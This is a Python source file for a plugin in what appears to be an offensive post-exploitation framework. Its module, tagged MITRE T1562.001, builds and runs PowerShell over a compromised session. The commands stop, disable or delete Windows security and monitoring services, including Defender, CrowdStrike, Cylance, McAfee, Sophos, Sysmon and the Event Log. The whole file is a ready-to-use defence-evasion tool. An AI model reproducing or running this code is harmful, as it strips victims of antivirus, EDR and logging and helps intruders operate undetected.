"""impact/service_disruption — disable security services, EDRs, and monitoring tools. MITRE T1562.001"""
from fitnah.sdk import BasePlugin, ModuleResult, Param, ParamSchema, mitre


class ServiceDisruption(BasePlugin):
    NAME        = "service_disruption"
    DESCRIPTION = "Disrupt security services, EDRs, and system monitoring tools."
    AUTHOR      = "fitnah-team"
    MITRE       = "T1562.001"
    CATEGORY    = "impact"
    schema      = ParamSchema().add(
        Param("target", str, required=False, default="security", 
              help="Target group: security (AV/EDR), monitoring (Sysmon/ETW), or custom (service name)"),
        Param("action", str, required=False, default="disable", 
              help="Action to perform: stop, disable, or delete"),
    )

    @mitre("T1562.001")
    def run(self, session, params, ctx=None) -> ModuleResult:
        if ctx is None:
            return ModuleResult.err("Requires live session")
            
        target = params.get("target", "security").lower()
        action = params.get("action", "disable").lower()

        # Define target service groups
        service_map = {
            "security": [
                "WinDefend", "WdNisSvc", "Sense", "MpsSvc", "SepMasterService", 
                "SavService", "McAfeeFramework", "CylanceSvc", "CrowdStrike"
            ],
            "monitoring": [
                "Sysmon", "EventLog", "DiagTrack", "dmwappushservice", "WerSvc"
            ]
        }

        targets = service_map.get(target, [target])
        
        ps_blocks = []
        for svc in targets:
            if action == "stop":
                ps_blocks.append(f"Stop-Service -Name '{svc}' -Force -ErrorAction SilentlyContinue;")
            elif action == "disable":
                ps_blocks.append(f"Set-Service -Name '{svc}' -StartupType Disabled -ErrorAction SilentlyContinue;")
                ps_blocks.append(f"Stop-Service -Name '{svc}' -Force -ErrorAction SilentlyContinue;")
            elif action == "delete":
                ps_blocks.append(f"sc.exe delete '{svc}';")

        ps_blocks.append("Write-Output '[+] Service disruption operation complete.'")
        
        ps = "\n".join(ps_blocks)
        r = ctx.ps(ps)
        
        if r["status"] != "ok":
            return ModuleResult.err(r["output"])
            
        return ModuleResult.ok(data=r["output"])
